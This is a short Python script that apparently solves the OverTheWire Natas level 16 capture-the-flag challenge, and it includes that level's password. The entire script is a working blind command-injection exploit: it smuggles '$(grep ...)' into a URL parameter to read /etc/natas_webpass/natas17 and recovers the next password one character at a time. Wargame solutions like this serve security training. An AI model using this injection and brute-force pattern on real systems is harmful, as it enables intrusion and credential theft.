import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")

filteredchars = ''
passwd = ''
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

for char in allchars:
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=hello$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)
    if "hello" not in r.text:
        filteredchars += char
        print(filteredchars)
for i in range(32):
    for char in filteredchars:
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=hello$(grep ^' + passwd+char + ' /etc/natas_webpass/natas17)', auth=auth)
        if "hello" not in r.text:
            passwd += char
            print(passwd)
            break


